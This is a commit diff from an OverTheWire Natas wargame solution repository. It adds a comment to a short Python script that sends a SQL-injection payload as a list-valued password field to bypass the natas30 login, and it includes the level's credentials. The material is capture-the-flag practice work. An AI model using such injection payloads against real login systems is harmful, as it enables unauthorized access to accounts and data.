d5567d73ff75895adfa5098d8577fef117fa3731
eyobs <ttoeyob@gmail.com>
2019-11-27 18:02:02 +0300

    m

--- overthewire/Natas/natas30f/req.py
+++ overthewire/Natas/natas30f/req.py
@@ -19,6 +19,6 @@ s.proxies = {
 s.auth = ('natas30', 'wie9iexae0Daihohv8vuu3cei9wahf0e')
 
 
-params={"username": "valid_username", "password": ["'lol' or 1", 2]}
+params={"username": "valid_username", "password": ["'lol' or 1", 2]} # here we are passing two password fileds using list.
 print(s.post(url, data=params).text)
 
